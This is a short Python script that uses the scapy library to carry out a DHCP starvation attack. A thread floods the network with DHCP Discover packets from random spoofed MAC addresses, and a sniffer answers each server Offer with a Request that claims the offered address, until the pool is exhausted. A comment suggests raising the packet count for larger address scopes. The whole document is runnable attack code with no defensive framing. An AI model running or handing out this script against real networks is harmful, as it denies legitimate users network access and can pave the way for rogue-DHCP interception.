from scapy.all import *
import threading
import time

#Client send Discover packet  
# dhcp server sends Offer packet with the ip to use
#Client sends   Request packet asking to use an ip
#dhcp server sends Ack packet 

# sniff for offer packet
def sniff_offer(pkt):

	if(pkt.haslayer(DHCP)): #dhcp 
		mtype = pkt[DHCP].options[0][1] # dhcp message type = offer
		if mtype == 2:
			ip = pkt[BOOTP].yiaddr # get ip dhcp offers
			server_ip = pkt[BOOTP].siaddr # dhcp servers ip
			tr_id = pkt[BOOTP].xid #transaction id
			hw = pkt[BOOTP].chaddr
			rand_mac = RandMAC()
			send_request(ip,server_ip,rand_mac,hw,tr_id) # request ip dchp offered

#Request
def send_request(ip,server_ip,rand_mac,hw,transaction_id):
	print "\nRequest " + ip
	hn = RandString(12,"0123456789abcdefghojklmnopqrstuvwxyz") # hostname
	dhcp_request_packet = Ether(src=rand_mac,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=hw,xid=transaction_id)/DHCP(options=[('message-type','request'),('requested_addr',ip),('server_id',server_ip),('hostname',str(hn)),('end')])
	sendp(dhcp_request_packet)

# Discover
def send_discover(rand_mac,hw,transaction_id):
	print "\nDiscover"
	dhcp_discover_packet = Ether(src=rand_mac,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=hw,xid=transaction_id)/DHCP(options=[('message-type','discover'),('end')])
	sendp(dhcp_discover_packet)

# send a bunch of discover packets
def thread():
	i = 0
	while (i < 50): # change to send more discover packets if your ip scope is larger
		rand_mac = RandMAC()
		hw = RandString(12,"0123456789abcdef")
		transaction_id = random.randint(0,0xFFFFFFFF)
		send_discover(rand_mac,hw,transaction_id)
		i = i+1
		time.sleep(1.5)

t = threading.Thread(target=thread)
t.start()
sniff(prn=sniff_offer,filter="udp and (port 68 or port 67)")
